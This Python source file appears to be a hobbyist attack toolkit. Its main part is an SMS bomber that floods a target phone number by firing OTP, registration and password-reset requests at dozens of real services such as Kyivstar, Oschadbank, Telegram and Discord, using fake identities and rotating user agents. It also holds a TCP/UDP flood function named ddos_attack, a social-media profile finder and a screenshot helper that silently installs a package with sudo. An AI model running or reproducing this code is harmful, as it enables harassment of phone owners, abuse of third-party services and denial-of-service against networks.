import socket
from fake_useragent import FakeUserAgent
from base64 import a85encode, a85decode
from subprocess import run, DEVNULL
from ipaddress import ip_address
from pyautogui import screenshot
from requests import get, post
from re import search, findall
from threading import Thread
from random import choice
from sys import platform
from time import sleep
def make_screenshot(file_name): 
    try: screenshot(file_name)
    except: 
        if platform == 'linux': run('sudo apt install -y scrot'.split(), stdout = DEVNULL, stderr = DEVNULL), screenshot(file_name)
        else: raise SystemError
def phone_sms_bomber(target_number_phone, how_much_sms_bomber_attacks, mode):
    if 'normal' in mode: timeout = 3
    elif 'medium' in mode: timeout = 2
    elif 'fast' in mode: timeout = 1
    try: get(url = 'https://www.google.com', headers = {'User-Agent': FakeUserAgent().random}, timeout = 10)
    except: raise ConnectionError('No internet connection')
    def _starting_phone_sms_bomber_format_json(url, json): 
        try: sleep(timeout), post(url = url, json = json, headers = {'User-Agent': FakeUserAgent().random}, timeout = 10)
        except: print(f'Send message {target_number_phone} [-]')
        else: print(f'Send message {target_number_phone} [+]')
    def _starting_phone_sms_bomber_format_data(url, data): 
        try: sleep(timeout), post(url = url, data = data, headers = {'User-Agent': FakeUserAgent().random}, timeout = 10)
        except: print(f'Send message {target_number_phone} [-]')
        else: print(f'Send message {target_number_phone} [+]')
    def _starting_phone_sms_bomber_type_request_get(url): 
        try: sleep(timeout), get(url = url, headers = {'User-Agent': FakeUserAgent().random}, timeout = 10)
        except: print(f'Send message {target_number_phone} [-]')
        else: print(f'Send message {target_number_phone} [+]')
    for _ in range(abs(how_much_sms_bomber_attacks)): 
        father_surname, name, surname, email, password = choice(['Миколайович', 'Мария', 'Володимирівна', 'Олександрович', 'Іванівна', 'Сергійович', 'Михайлович', 'Вікторівна']), choice(['Михаил', 'Ала', 'Влада', 'Андрей', 'Гоша', 'Рамин', 'Аня', 'Кирил', 'Виктория', 'Викторий', 'Алексей', 'Петя', 'Лиля', 'Игорь', 'Том', 'Валерий', 'Лиза', 'Дима', 'Даня', 'Руслан', 'Женя', 'Тамара', 'Валентин', 'Валентина', 'Гриша', 'Инокентий', 'Собалев', 'Паша', 'Свят', 'Артур']), choice(['Овербафер1', 'Кузьняков', 'Овичев', 'Анатоливна', 'Дударь', 'Топалова', 'Вознюк', 'Кривашапка', 'Галушина', 'Плахотин', 'Весникова', 'Иванкина', 'Иваничь', 'Смирнов', 'Соколов', 'Попов', 'Иванов', 'Козлов']), choice(['top123good@gmail.com', 'noob123god@gmail.com', 'tamara123@gmail.com', 'artur123@gmail.com', 'alina123@gmail.com', 'top123top123@gmail.com']), choice(['V1230987good', 'GoodHello123', 'GoodBye0987', 'How12345086', 'StopigNo567107', 'YouDummy10', '123098hgS', 'dfdidHjkKlksS2323', '123Abs321abS', 'YouNowOh126877', '666Now666', '345Fodig', 'PleaseRegisternow1', 'DrinkNow4556', 'SEX123', 'PASSWORD123', 'password0987', 'dog1', 'cat2', 'dogandcat12', 'Peta123peta0987'])
        _starting_phone_sms_bomber_format_json(url = 'https://account.kyivstar.ua/cas/new/api/otp/send?locale=uk', json = {'action': 'registration', 'captcha': None, 'login': target_number_phone[1:]}), _starting_phone_sms_bomber_format_data(url = 'https://germes.one/ajax/registration/', data = {'userFirstName': name, 'userTel': target_number_phone, 'userEmail': email, 'userPassword': password, 'userConfirmPassword': password}), _starting_phone_sms_bomber_format_data(url = 'https://pidbir.com/lib/ajax.php', data = {'command': 'auth', 'phone': target_number_phone, 'employer': '0'}), _starting_phone_sms_bomber_type_request_get(url = f'https://c2c.oschadbank.ua/api/sms/{target_number_phone[1:]}'), _starting_phone_sms_bomber_format_json(url = 'https://api.creditkasa.ua/public/auth/sendAcceptanceCode', json = {'brandName': 'NaVse', 'mobilePhone': target_number_phone[1:], 'productGroup': 'INSTALLMENT'}),  _starting_phone_sms_bomber_format_data(url = 'https://my.ctrs.com.ua/api/auth/login', data = {'_token': 'C7xZ8x0Zk8gwbCVSCcOxPo4Wd0LtEbMTS7SKka6u', 'identity': target_number_phone}), _starting_phone_sms_bomber_format_data(url = 'https://my.telegram.org/auth/send_password', data = {'phone': target_number_phone}), _starting_phone_sms_bomber_format_json(url = 'https://discord.com/api/v9/auth/forgot', json = {'login': target_number_phone}), _starting_phone_sms_bomber_format_json(url = 'https://megasport.ua/api/auth/phone/?auth=web_client_2&language=ua', json = {'phone': target_number_phone}), _starting_phone_sms_bomber_format_json(url = 'https://bi.ua/api/v1/accounts', json = {'grand_type': 'call_code', 'login': name, 'phone': target_number_phone[1:], 'stage': '1'}), _starting_phone_sms_bomber_format_json(url = 'https://money4you.ua/api/clientRegistration/sendValidationSms', json = {'fathersName': father_surname, 'firstName': name, 'lastName': surname, 'phone': target_number_phone, 'udriveEmployee': False}), _starting_phone_sms_bomber_format_json(url = 'https://cscapp.vodafone.ua/eai_smob/start.swe?SWEExtSource=JSONConverter&SWEExtCmd=Execute', json = {'params': {'version': '2.1.2', 'language': 'ua', 'source': 'WebApp', 'token': None, 'manufacture': '', 'childNumber': '', 'accessType': '', 'spinner': '1'}, 'requests': {'loginV2': {'id': target_number_phone[4:]}}}), _starting_phone_sms_bomber_format_json(url = 'https://chicco.com.ua/api/user/public/register/phone', json = {'firstName': name, 'language': 'ua', 'phone': target_number_phone[1:], 'pregnancyDueDate': None, 'project': 'chicco'}), _starting_phone_sms_bomber_format_json(url = 'https://api.finsfera.ua/client', json = {'operationName': 'SendCode', 'query': 'mutation SendCode($phone: String!, $channel: smsChannel) {  sendCode(phone: $phone, channel: $channel) {    ... on SendCode {      message      __typename    }    ... on Error {      warnings {        warning        key        __typename      }      error      __typename    }    __typename  }}', 'variables': {'channel': 'SMS', 'phone': f'{target_number_phone[0:4]} ({target_number_phone[4:6]}) {target_number_phone[6:9]} {target_number_phone[9:11]} {target_number_phone[11:13]}'}}), _starting_phone_sms_bomber_format_json(url = 'https://varus.ua/api/ext/uas/auth/send-otp?storeCode=ru', json = {'phone': target_number_phone}), _starting_phone_sms_bomber_format_data(url = 'https://rieltor.ua/api/users/register-sms/', data = {'phone': target_number_phone[1:], 'recaptcha': '03AFcWeA7GshlcHxhT0J9z81Vlr1T-BJOqdFslof-GW2keTnqOT7A-IZ81IweJ7NsLNrUif4NX9mzDXbQ5VuHNOlUEiWKSoLioSmR5RHUVaMz_cTr2TP8lmqAA2k1VpD5yFAYfjuzUfTOKrvUgKfyfPvMk_8auUf6di4dwFvqjX6Mjh-fj72rv3CRJX4jWi3Lr7xipTtFiGIhdWcyvd0Z2L8DirypKCqhMplcQSdLLoCGHPC3LYbqwVAOPrVrvegBFrkM3i5P3fCJojdWxmh2vNhZbjucGTo0p_OPWktCeliZD-JYbpi-08Y9IzglglMXF4fKsmIueYqczKdkGxX7Prjes8Oq9gl8d7pMo1HtYfOZK58UDHZv87S_NnzeheYKmKIr00mH5453_wcuxtBN3TH_yQI6Q-IJdWy8-PejHqwKPfk9y2L8YM3ROUZ_e84Q95gNJLUOQE2XVtO_vzFnfZujv79U6Vb6ZJHA9IxAJ04_ozxaNcd6bpo16KK6j5rfK4ltOg9k_gpq-qlPJiqDbgSL60BdTSNLDyyefRvtFgAGp2e7qqbNlJB52v9bxV4Xtv5m_BPqKM2l3NvcuE99zgvJykUEevPSEyJx8FMFzB1ruStysBWZUxqIstJW6k0DMBlP91KnoRmd7qlI2YUpUjpy47jKjoYlLFJx3K_VJ9o95kFkq4UunzTg', 'retry': 0}), _starting_phone_sms_bomber_format_json(url = 'https://uss.rozetka.com.ua/session/auth/remind-password', json = {'country': 'UA', 'lang': 'ua', 'login': target_number_phone}), _starting_phone_sms_bomber_format_json(url = 'https://ucb.l.podorozhnyk.com/api/send/otp', json = {'phone': target_number_phone[1:]}), _starting_phone_sms_bomber_format_json(url = 'https://helsi.me/api/healthy/v2/accounts/login', json = {'phone': target_number_phone[1:], 'platform': 'PISWeb'}), _starting_phone_sms_bomber_format_json(url = 'https://galafarm.com.ua/api/auth/register', json = {'locale': 'uk', 'name': name, 'password': password, 'password_confirmation': password, 'phone': f'{target_number_phone[0:3]} ({target_number_phone[3:6]}) {target_number_phone[6:9]}-{target_number_phone[9:11]}-{target_number_phone[11:13]}', 'surname': surname}), _starting_phone_sms_bomber_format_json(url = 'https://api.likie.ua/password/restore/send_otp?city=Харків&locale=UK', json = {'phone': f'{target_number_phone[0:4]} {target_number_phone[4:6]} {target_number_phone[6:9]} {target_number_phone[9:11]} {target_number_phone[11:13]}', 'utm': {'campaign': 'poshuk_apteka_ua_ukr', 'content': 'apteka_komerc', 'medium': 'cpc', 'source': 'google'}}), _starting_phone_sms_bomber_format_data(url = 'https://credit7.ua/client/registration/general-information', data = {'customer_profile_id': '', 'mobile_phone': f'({target_number_phone[3:6]})+{target_number_phone[6:9]}+{target_number_phone[9:11]}+{target_number_phone[11:13]}', 'date_of_birth': choice(['11.11.2001', '10.10.2000', '19.11.1999', '20.10.2002', '12.12.2002'])}), _starting_phone_sms_bomber_format_json(url = 'https://api.creditkasa.ua/public/auth/sendAcceptanceCode', json = {'brandName': 'CreditKasa', 'mobilePhone': target_number_phone[1:], 'productGroup': 'PDL'}), _starting_phone_sms_bomber_format_json(url = 'https://prostor.ua/ua/rest/V1/customer/send-otp/', json = {'phoneNumber': target_number_phone[1:]}), _starting_phone_sms_bomber_format_data(url = 'https://germes.one/ajax/authorization/', data = {'userTelEmail': target_number_phone}), _starting_phone_sms_bomber_format_data(url = 'https://xn--90aiim0b.com.ua/loginsms.php', data = {'phone': target_number_phone, 'sms': '', 'act': 'sendpassword'}), _starting_phone_sms_bomber_format_json(url = 'https://gepur.com/rapi/auth/register-retail-buyer', json = {'email': email, 'firstName': name, 'lastName': surname, 'password': password, 'phone': target_number_phone}), _starting_phone_sms_bomber_format_json(url = 'https://api.creditkasa.ua/public/auth/sendAcceptanceCode', json = {}), _starting_phone_sms_bomber_format_json(url = 'https://avrora.ua/index.php?dispatch=otp.send', json = {'phone': f'{target_number_phone[0:4]}({target_number_phone[4:6]}){target_number_phone[6:9]}-{target_number_phone[9:11]}-{target_number_phone[11:13]}', 'security_hash': 'e12440eaedeb21d6faad4721f673325f', 'is_ajax': '1'}), _starting_phone_sms_bomber_format_json(url = 'https://admin.pavluks-trans.com/api/auth/v2/register', json = {'email': email, 'getNews': False, 'name': name, 'password': password, 'phone': target_number_phone[1:]}), _starting_phone_sms_bomber_format_data(url = 'https://www.tavriav.ua/send-email', data = {'username': target_number_phone[1:], 'phone': 'phone'}), _starting_phone_sms_bomber_format_json(url = 'https://kitchen-profi.com.ua/index.php?route=account/otp/send', json = {'telephone': f'{target_number_phone[0:3]}({target_number_phone[3:6]}){target_number_phone[6:9]}-{target_number_phone[9:11]}-{target_number_phone[11:13]}'}), _starting_phone_sms_bomber_format_data(url = 'https://tehnomarket.ua/handler_ajax.php', data = {'action': 'register', 'data[action]': 'register', 'data[fname]': name, 'data[lname]': surname, 'data[login]': target_number_phone, 'data[password]': password}), _starting_phone_sms_bomber_format_data(url = 'https://sex-shop-g.com.ua/index.php?route=extension/module/sms_reg/SmsCheck', data = {'phone': f'{target_number_phone[0:3]}({target_number_phone[3:6]})+{target_number_phone[6:9]}-{target_number_phone[9:11]}-{target_number_phone[11:13]}'}), _starting_phone_sms_bomber_format_json(url = 'https://eleyus.com/api/v1/auth/registration/', json = {'emailPhone': target_number_phone, 'firstName': name, 'lastName': surname, 'newEmailPhone': '', 'password': password}), _starting_phone_sms_bomber_type_request_get(url = f'https://api.prosto.net/v2/verify?type=intl_phone&value=%{target_number_phone[1:]}'), _starting_phone_sms_bomber_format_json(url = 'https://maslotom.com/api/index.php?route=api/account/phoneLogin', json = {'phone': f'{target_number_phone[0:4]}({target_number_phone[4:6]}){target_number_phone[6:9]}-{target_number_phone[9:11]}-{target_number_phone[11:13]}'}), _starting_phone_sms_bomber_type_request_get(url = f'https://shop.kyivstar.ua/api/v2/otp_login/send/{target_number_phone[3:]}'), _starting_phone_sms_bomber_format_json(url = 'https://autoplus.ua/users/sendcode', json = {'counter': 0, 'phone': f'({target_number_phone[3:6]}) {target_number_phone[6:9]}-{target_number_phone[9:11]}-{target_number_phone[11:13]}', 'source': 'auth'}), _starting_phone_sms_bomber_type_request_get(url = f'https://vivat.com.ua/phone_auth/request/{target_number_phone[1:]}?lang=uk'), _starting_phone_sms_bomber_format_json(url = 'https://holdyou.net/api/users/forgot-password', json = {'username': target_number_phone[1:]}), _starting_phone_sms_bomber_format_data(url = 'https://pidbir.com/lib/ajax.php', data = {'command': 'auth', 'phone': target_number_phone, 'employer': '1'})
def ddos_attack(target_ip_address, how_much_attacks):
    try: ip_address(target_ip_address)
    except ValueError: raise ValueError('Not correct ip-address')
    if type(how_much_attacks) != int: raise TypeError(f"Don't must be(how_much_attacks = {type(how_much_attacks).__name__}) it must be type int")
    if how_much_attacks == 0: raise ValueError('Not must be zero in how_much_attacks')
    chars, words = '+-_%~/*!&$#?=@<^>[](),.abcdefghijklnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890', ''
    for _ in range(65_000): words += choice(chars)
    def _dos_attack_on_tcp():    
        def _starting_tcp(port):
            for _ in range(abs(how_much_attacks)):
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as dos_attacking_on_tcp:
                    try: dos_attacking_on_tcp.connect((target_ip_address, port))
                    except: break
                    try: print(f'Ddos-Attacking --> {target_ip_address}'), dos_attacking_on_tcp.sendall(words.encode('ascii'))
                    except: pass
        for port_tcp in [1, 2, 20, 21, 22, 23, 25, 33, 53, 80, 110, 123, 135, 137, 138, 139, 161, 443, 445, 1025, 1080, 3389, 5000, 8080]: _starting_tcp(port_tcp)
    def _dos_attack_on_udp(): 
        def _starting_udp(port):
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as dos_attacking_on_udp:
                    for _ in range(abs(how_much_attacks) + 4_000):
                        try: print(f'Ddos-Attacking --> {target_ip_address}'), dos_attacking_on_udp.sendto(words.encode('ascii'), (target_ip_address, port))
                        except: pass
        for port_udp in [1, 2, 22, 23, 25, 53, 110, 123, 123, 135, 137, 138, 139, 161, 443, 445, 1025, 1080, 5000]: _starting_udp(port_udp)
    Thread(target = _dos_attack_on_tcp, name = 'TCP').start(), Thread(target = _dos_attack_on_udp, name = 'UDP').start()
def download_website(url_website, file_name): 
    try:
        if get(url = url_website, headers = {'User-Agent': FakeUserAgent().random}): 
            with open(file = f'{file_name}.html', mode = 'wb') as website: website.write(get(url = url_website, headers = {'user_agent': FakeUserAgent().random}).content)
        else: print("Didn't download website")
    except: raise ConnectionError
def search_socials_network_profile(nickname):
    try:
        nickname = nickname.replace(' ', '.')
        for url_profile_facebook in findall(r'href="(\S+)"', get(url = f'https://www.facebook.com/{nickname}/').text):
            if nickname in url_profile_facebook: 
                if not '/' == url_profile_facebook[-1]: print(f'Facebook: {url_profile_facebook}/')
                else: print(f'Facebook: {url_profile_facebook}')
                break
        if search(rf'(https://www.instagram.com/{nickname}/)', get(f'https://www.instagram.com/{nickname}/').text): print('Instagram: ' + search(rf'(https://www.instagram.com/{nickname}/)', get(f'https://www.instagram.com/{nickname}/').text).group(1))
        if search(f'@{nickname.replace(".", "")}', get(url = f'https://www.tiktok.com/@{nickname.replace(".", "")}', headers = {'User-Agent': FakeUserAgent().random}).text): print(f'Tiktok: https://www.tiktok.com/@{nickname.replace(".", "")}/')
        if search(nickname.replace(".", ""), get(url = f'https://t.me/s/{nickname.replace(".", "")}/').text): print(f'Telegram: https://t.me/s/{nickname.replace(".", "")}/')
        if search(nickname.replace(".", ""), get(url = f'https://www.reddit.com/user/{nickname.replace(".", "")}/').text): print(f'Reddit: https://www.reddit.com/user/{nickname.replace(".", "")}/')
        if search(nickname.replace(".", ""), get(url = f'https://www.pinterest.com/{nickname.replace(".", "")}/').text): print(f'Pinterest: https://www.pinterest.com/{nickname.replace(".", "")}/')
        if not get(url = f'https://github.com/{nickname.replace(".", "")}/').text == 'Not Found': print(f'GitHub: https://github.com/{nickname.replace(".", "")}/')
    except: raise SystemError
def encode_file(file_path):
    try:
        with open(file = file_path, mode = 'r') as reading_for_encode_file: data = reading_for_encode_file.read()
    except FileNotFoundError: print('This file not found')
    else:
        with open(file = file_path, mode = 'wb') as writing_encode_data_in_the_file: writing_encode_data_in_the_file.write(a85encode(data.encode()))
def decode_file(file_path): 
    try:
        with open(file = file_path, mode = 'rb') as reading_encoded_the_file: all_information_decoded = a85decode(reading_encoded_the_file.read()).decode()
    except FileNotFoundError: print('This file not found')
    else:
        with open(file = file_path, mode = 'w') as file_with_result_decoded: file_with_result_decoded.write(all_information_decoded)
